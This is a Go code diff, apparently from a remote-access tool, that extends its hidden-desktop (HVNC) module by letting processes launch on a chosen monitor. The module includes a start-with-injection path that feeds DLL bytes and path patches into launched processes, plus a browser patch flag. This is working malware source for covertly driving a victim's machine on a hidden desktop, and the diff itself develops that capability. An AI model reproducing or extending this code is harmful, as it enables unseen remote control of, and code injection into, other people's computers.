@@ -490,9 +490,9 @@ func ensureHVNCThread() error {
 				var result hvncTaskResult
 				switch task.kind {
 				case hvncTaskStartProcess:
-					result.pid, result.err = startHVNCProcessOnThread(task.filePath)
+					result.pid, result.err = startHVNCProcessOnThread(task.filePath, task.display)
 				case hvncTaskStartProcessInjected:
-					result.pid, result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
+					result.pid, result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath, task.display)
 				case hvncTaskMouseMove:
 					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
 				case hvncTaskMouseDown:
@@ -546,13 +546,14 @@ func hvncCaptureDisplay(display int) (*image.RGBA, error) {
 	return result.img, result.err
 }
 
-func StartHVNCProcess(filePath string, operaPatch bool) error {
+func StartHVNCProcess(filePath string, operaPatch bool, display int) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
 	result, err := executeHVNCTask(hvncTask{
 		kind:     hvncTaskStartProcess,
 		filePath: strings.TrimSpace(filePath),
+		display:  display,
 	}, 10*time.Second)
 	if err != nil {
 		return err
@@ -917,7 +918,7 @@ func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	return img, nil
 }
 
-func startHVNCProcessOnThread(filePath string) (uint32, error) {
+func startHVNCProcessOnThread(filePath string, display int) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
@@ -930,12 +931,17 @@ func startHVNCProcessOnThread(filePath string) (uint32, error) {
 	if err != nil {
 		return 0, fmt.Errorf("failed to convert command line: %v", err)
 	}
+	posX, posY := 0, 0
+	if mons := monitorList(); display >= 0 && display < len(mons) {
+		posX = mons[display].rect.Min.X
+		posY = mons[display].rect.Min.Y
+	}
 	var si startupInfo
 	var pi processInformation
 	si.cb = uint32(unsafe.Sizeof(si))
 	si.lpDesktop = desktopNamePtr
-	si.dwX = 0
-	si.dwY = 0
+	si.dwX = uint32(posX)
+	si.dwY = uint32(posY)
 	si.dwFlags = STARTF_USEPOSITION
 
 	ret, _, callErr := procCreateProcessW.Call(
@@ -971,7 +977,7 @@ func hvncAutoStartExplorerOnThread() error {
 	}
 
 	log.Printf("hvnc: no explorer.exe found on HVNC desktop, starting explorer.exe")
-	_, err := startHVNCProcessOnThread("explorer.exe")
+	_, err := startHVNCProcessOnThread("explorer.exe", 0)
 	if err != nil {
 		return fmt.Errorf("auto-start explorer failed: %w", err)
 	}
